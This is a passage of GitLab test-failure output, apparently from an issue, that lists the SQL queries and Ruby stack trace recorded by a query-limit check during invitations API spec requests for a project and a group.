\"notification_settings\".\"user_id\" = 740 AND \"notification_settings\".\"source_type\" IS NULL AND \"notification_settings\".\"source_id\" IS NULL LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       103: INSERT INTO \"notification_settings\" (\"user_id\", \"level\", \"created_at\", \"updated_at\") VALUES (740, 1, '2022-03-01 16:06:45.603369', '2022-03-01 16:06:45.603369') RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       104: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       105: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"invite_email\" = 'email1@example.com' AND \"members\".\"id\" != 1074 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       106: SELECT a.attname, format_type(a.atttypid, a.atttypmod),\n              pg_get_expr(d.adbin, d.adrelid), a.attnotnull, a.atttypid, a.atttypmod,\n              c.collname, col_description(a.attrelid, a.attnum) AS comment\n         FROM pg_attribute a\n         LEFT JOIN pg_attrdef d ON a.attrelid = d.adrelid AND a.attnum = d.adnum\n         LEFT JOIN pg_type t ON a.atttypid = t.oid\n         LEFT JOIN pg_collation c ON a.attcollation = c.oid AND a.attcollation \u003c\u003e t.typcollation\n        WHERE a.attrelid = '\"audit_events\"'::regclass\n          AND a.attnum \u003e 0 AND NOT a.attisdropped\n        ORDER BY a.attnum\n\n       107: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       108: INSERT INTO \"audit_events\" (\"author_id\", \"entity_id\", \"entity_type\", \"details\", \"author_name\", \"target_details\", \"created_at\", \"target_type\") VALUES (736, 99, 'Project', '---\n       :add: user_access\n       :as: Developer\n       :author_name: Sidney Jones2\n       :target_id:\n       :member_id: 1074\n       :target_type: User\n       :target_details: Deleted User\n       ', 'Sidney Jones2', 'Deleted User', '2022-03-01 16:06:45.630181', 'User') RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       109: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       110: SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 99 ORDER BY \"projects\".\"id\" ASC LIMIT 1000 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       111: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       112: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"invite_email\" = 'email2@example.com' AND \"members\".\"id\" != 1075 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       113: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       114: INSERT INTO \"audit_events\" (\"author_id\", \"entity_id\", \"entity_type\", \"details\", \"author_name\", \"target_details\", \"created_at\", \"target_type\") VALUES (736, 99, 'Project', '---\n       :add: user_access\n       :as: Developer\n       :author_name: Sidney Jones2\n       :target_id:\n       :member_id: 1075\n       :target_type: User\n       :target_details: Deleted User\n       ', 'Sidney Jones2', 'Deleted User', '2022-03-01 16:06:45.658193', 'User') RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       115: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       116: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"user_id\" = 739 AND \"members\".\"id\" != 1076 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       117: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       118: INSERT INTO \"audit_events\" (\"author_id\", \"entity_id\", \"entity_type\", \"details\", \"author_name\", \"target_details\", \"created_at\", \"target_type\", \"target_id\") VALUES (736, 99, 'Project', '---\n       :add: user_access\n       :as: Developer\n       :author_name: Sidney Jones2\n       :target_id: 739\n       :member_id: 1076\n       :target_type: User\n       :target_details: Sidney Jones5\n       ', 'Sidney Jones2', 'Sidney Jones5', '2022-03-01 16:06:45.669817', 'User', 739) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       119: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       120: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"user_id\" = 740 AND \"members\".\"id\" != 1077 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       121: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       122: INSERT INTO \"audit_events\" (\"author_id\", \"entity_id\", \"entity_type\", \"details\", \"author_name\", \"target_details\", \"created_at\", \"target_type\", \"target_id\") VALUES (736, 99, 'Project', '---\n       :add: user_access\n       :as: Developer\n       :author_name: Sidney Jones2\n       :target_id: 740\n       :member_id: 1077\n       :target_type: User\n       :target_details: Sidney Jones6\n       ', 'Sidney Jones2', 'Sidney Jones6', '2022-03-01 16:06:45.681974', 'User', 740) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       123: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       124: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       125: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"owner_id\" = 736 AND \"namespaces\".\"type\" = 'User' LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       126: UPDATE \"users\" SET \"updated_at\" = '2022-03-01 16:06:45.726506', \"last_activity_on\" = '2022-03-01' WHERE \"users\".\"id\" = 736 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       127: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       128: SELECT \"emails\".\"email\" FROM \"emails\" WHERE \"emails\".\"user_id\" = 736 AND \"emails\".\"confirmed_at\" IS NOT NULL /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n     Shared Example Group: \"POST /:source_type/:id/invitations\" called from ./spec/requests/api/invitations_spec.rb:315\n     # ./lib/gitlab/query_limiting/transaction.rb:57:in `act_upon_results'\n     # ./lib/gitlab/query_limiting/middleware.rb:21:in `call'\n     # ./lib/gitlab/database/load_balancing/rack_middleware.rb:23:in `call'\n     # ./lib/gitlab/jira/middleware.rb:19:in `call'\n     # ./lib/gitlab/middleware/go.rb:20:in `call'\n     # ./lib/gitlab/etag_caching/middleware.rb:21:in `call'\n     # ./lib/gitlab/middleware/query_analyzer.rb:11:in `block in call'\n     # ./lib/gitlab/database/query_analyzer.rb:37:in `within'\n     # ./lib/gitlab/middleware/query_analyzer.rb:11:in `call'\n     # ./lib/gitlab/middleware/multipart.rb:173:in `call'\n     # ./lib/gitlab/middleware/read_only/controller.rb:50:in `call'\n     # ./lib/gitlab/middleware/read_only.rb:18:in `call'\n     # ./lib/gitlab/middleware/same_site_cookies.rb:27:in `call'\n     # ./lib/gitlab/middleware/handle_malformed_strings.rb:21:in `call'\n     # ./lib/gitlab/middleware/basic_health_check.rb:25:in `call'\n     # ./lib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call'\n     # ./lib/gitlab/middleware/request_context.rb:21:in `call'\n     # ./lib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call'\n     # ./config/initializers/fix_local_cache_middleware.rb:11:in `call'\n     # ./lib/gitlab/middleware/compressed_json.rb:26:in `call'\n     # ./lib/gitlab/middleware/static.rb:11:in `call'\n     # ./lib/gitlab/testing/clear_process_memory_cache_middleware.rb:13:in `call'\n     # ./lib/gitlab/testing/request_inspector_middleware.rb:35:in `call'\n     # ./lib/gitlab/testing/robots_blocker_middleware.rb:30:in `call'\n     # ./lib/gitlab/testing/request_blocker_middleware.rb:47:in `call'\n     # ./lib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call'\n     # ./lib/gitlab/middleware/sidekiq_web_static.rb:20:in `call'\n     # ./lib/gitlab/metrics/requests_rack_middleware.rb:77:in `call'\n     # ./spec/requests/api/invitations_spec.rb:132:in `block (6 levels) in \u003cmain\u003e'\n     # ./spec/requests/api/invitations_spec.rb:128:in `block (5 levels) in \u003cmain\u003e'\n     # ./spec/spec_helper.rb:422:in `block (3 levels) in \u003cmain\u003e'\n     # ./spec/support/sidekiq_middleware.rb:9:in `with_sidekiq_server_middleware'\n     # ./spec/spec_helper.rb:413:in `block (2 levels) in \u003cmain\u003e'\n     # ./spec/spec_helper.rb:409:in `block (3 levels) in \u003cmain\u003e'\n     # ./lib/gitlab/application_context.rb:45:in `with_raw_context'\n     # ./spec/spec_helper.rb:409:in `block (2 levels) in \u003cmain\u003e'\n     # ./spec/spec_helper.rb:266:in `block (2 levels) in \u003cmain\u003e'\n     # ./spec/support/system_exit_detected.rb:7:in `block (2 levels) in \u003cmain\u003e'\n     # ./spec/support/database/prevent_cross_joins.rb:106:in `block (3 levels) in \u003cmain\u003e'\n     # ./spec/support/database/prevent_cross_joins.rb:60:in `with_cross_joins_prevented'\n     # ./spec/support/database/prevent_cross_joins.rb:106:in `block (2 levels) in \u003cmain\u003e'\n     # -e:1:in `\u003cmain\u003e'\n```\n\n\u003c/details\u003e\n\n\u003cdetails\u003e\u003csummary\u003eFor a Group from invitations API spec\u003c/summary\u003e\n\n```console\n      0: SELECT \"personal_access_tokens\".* FROM \"personal_access_tokens\" WHERE \"personal_access_tokens\".\"token_digest\" = 'wWE81PjYKXZw+/hn/re3wsd3peVP1IgU83IMIOg47js=' LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       1: SELECT \"licenses\".* FROM \"licenses\" ORDER BY \"licenses\".\"id\" DESC LIMIT 100 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       2: UPDATE \"personal_access_tokens\" SET \"last_used_at\" = '2022-03-01 16:06:46.313249' WHERE \"personal_access_tokens\".\"id\" = 181 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       3: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 736 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       4: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       5: SELECT \"saml_providers\".* FROM \"saml_providers\" WHERE \"saml_providers\".\"group_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       6: SELECT MAX(\"members\".\"access_level\") AS maximum_access_level, \"members\".\"user_id\" AS members_user_id FROM ((SELECT \"members\".\"id\", \"members\".\"access_level\", \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\" LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"users\".\"state\" = 'active' AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"invite_token\" IS NULL AND (members.access_level \u003e 5) AND (members.access_level \u003e 5) AND \"members\".\"source_id\" = 1011)\n       UNION\n       (WITH \"group_group_links_cte\" AS MATERIALIZED (SELECT \"group_group_links\".* FROM \"group_group_links\" WHERE \"group_group_links\".\"shared_group_id\" = 1011) SELECT \"members\".\"id\", LEAST(\"group_group_links\".\"group_access\", \"members\".\"access_level\") AS access_level, \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\", \"group_group_links_cte\" AS \"group_group_links\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"source_id\" = \"group_group_links\".\"shared_with_group_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"state\" = 0 AND (members.access_level \u003e 5))) members WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"user_id\" = 736 GROUP BY \"members\".\"user_id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       7: SELECT \"gitlab_subscriptions\".* FROM \"gitlab_subscriptions\" WHERE \"gitlab_subscriptions\".\"namespace_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       8: SELECT \"plans\".* FROM \"plans\" WHERE \"plans\".\"name\" = 'free' LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       9: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       10: SELECT 1 AS one FROM \"gitlab_subscriptions\" WHERE \"gitlab_subscriptions\".\"namespace_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       11: INSERT INTO \"gitlab_subscriptions\" (\"created_at\", \"updated_at\", \"start_date\", \"namespace_id\") VALUES ('2022-03-01 16:06:46.371957', '2022-03-01 16:06:46.371957', '2022-03-01', 1011) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       12: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       13: SELECT \"plans\".* FROM \"plans\" WHERE \"plans\".\"name\" = 'free' LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       14: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       15: INSERT INTO \"plans\" (\"created_at\", \"updated_at\", \"name\") VALUES ('2022-03-01 16:06:46.383814', '2022-03-01 16:06:46.383814', 'free') RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       16: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       17: SELECT \"plan_limits\".\"id\", \"plan_limits\".\"plan_id\", \"plan_limits\".\"ci_active_pipelines\", \"plan_limits\".\"ci_pipeline_size\", \"plan_limits\".\"ci_active_jobs\", \"plan_limits\".\"project_hooks\", \"plan_limits\".\"group_hooks\", \"plan_limits\".\"ci_project_subscriptions\", \"plan_limits\".\"ci_pipeline_schedules\", \"plan_limits\".\"offset_pagination_limit\", \"plan_limits\".\"ci_instance_level_variables\", \"plan_limits\".\"storage_size_limit\", \"plan_limits\".\"ci_max_artifact_size_lsif\", \"plan_limits\".\"ci_max_artifact_size_archive\", \"plan_limits\".\"ci_max_artifact_size_metadata\", \"plan_limits\".\"ci_max_artifact_size_trace\", \"plan_limits\".\"ci_max_artifact_size_junit\", \"plan_limits\".\"ci_max_artifact_size_sast\", \"plan_limits\".\"ci_max_artifact_size_dependency_scanning\", \"plan_limits\".\"ci_max_artifact_size_container_scanning\", \"plan_limits\".\"ci_max_artifact_size_dast\", \"plan_limits\".\"ci_max_artifact_size_codequality\", \"plan_limits\".\"ci_max_artifact_size_license_management\", \"plan_limits\".\"ci_max_artifact_size_license_scanning\", \"plan_limits\".\"ci_max_artifact_size_performance\", \"plan_limits\".\"ci_max_artifact_size_metrics\", \"plan_limits\".\"ci_max_artifact_size_metrics_referee\", \"plan_limits\".\"ci_max_artifact_size_network_referee\", \"plan_limits\".\"ci_max_artifact_size_dotenv\", \"plan_limits\".\"ci_max_artifact_size_cobertura\", \"plan_limits\".\"ci_max_artifact_size_terraform\", \"plan_limits\".\"ci_max_artifact_size_accessibility\", \"plan_limits\".\"ci_max_artifact_size_cluster_applications\", \"plan_limits\".\"ci_max_artifact_size_secret_detection\", \"plan_limits\".\"ci_max_artifact_size_requirements\", \"plan_limits\".\"ci_max_artifact_size_coverage_fuzzing\", \"plan_limits\".\"ci_max_artifact_size_browser_performance\", \"plan_limits\".\"ci_max_artifact_size_load_performance\", \"plan_limits\".\"ci_needs_size_limit\", \"plan_limits\".\"conan_max_file_size\", \"plan_limits\".\"maven_max_file_size\", \"plan_limits\".\"npm_max_file_size\", \"plan_limits\".\"nuget_max_file_size\", \"plan_limits\".\"pypi_max_file_size\", \"plan_limits\".\"generic_packages_max_file_size\", \"plan_limits\".\"golang_max_file_size\", \"plan_limits\".\"debian_max_file_size\", \"plan_limits\".\"project_feature_flags\", \"plan_limits\".\"ci_max_artifact_size_api_fuzzing\", \"plan_limits\".\"ci_pipeline_deployments\", \"plan_limits\".\"pull_mirror_interval_seconds\", 